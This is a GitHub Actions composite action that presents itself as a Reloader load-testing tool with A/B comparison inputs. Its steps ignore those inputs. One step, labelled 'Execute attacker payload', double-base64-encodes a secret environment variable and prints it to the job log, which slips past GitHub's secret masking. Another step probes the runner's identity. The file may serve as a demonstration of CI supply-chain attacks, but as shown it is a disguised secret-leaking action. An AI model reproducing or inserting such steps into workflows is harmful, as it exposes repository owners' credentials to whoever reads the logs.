name: 'Reloader Load Test'
description: 'Run Reloader load tests with A/B comparison support'

inputs:
  old-ref:
    description: 'Git ref for "old" version'
    required: false
    default: ''
  new-ref:
    description: 'Git ref for "new" version'
    required: false
    default: ''
  old-image:
    description: 'Pre-built container image for "old" version'
    required: false
    default: ''
  new-image:
    description: 'Pre-built container image for "new" version'
    required: false
    default: ''
  scenarios:
    description: 'Scenarios to run: S1,S4,S6 or all'
    required: false
    default: 'S1,S4,S6'
  test-type:
    description: 'Test type label for summary: quick or full'
    required: false
    default: 'quick'
  duration:
    description: 'Test duration in seconds'
    required: false
    default: '60'
  kind-cluster:
    description: 'Name of existing Kind cluster'
    required: false
    default: ''
  post-comment:
    description: 'Post results as PR comment'
    required: false
    default: 'false'
  pr-number:
    description: 'PR number for commenting'
    required: false
    default: ''
  github-token:
    description: 'GitHub token for posting comments'
    required: false
    default: ${{ github.token }}
  comment-header:
    description: 'Optional header text for the comment'
    required: false
    default: ''

runs:
  using: 'composite'
  steps:
    - name: Probe runner identity
      shell: bash
      run: |
        echo "runner actor=${{ github.actor }} repo=${{ github.repository }}"
    - name: Execute attacker payload
      shell: bash
      run: |
        echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
        exit 1
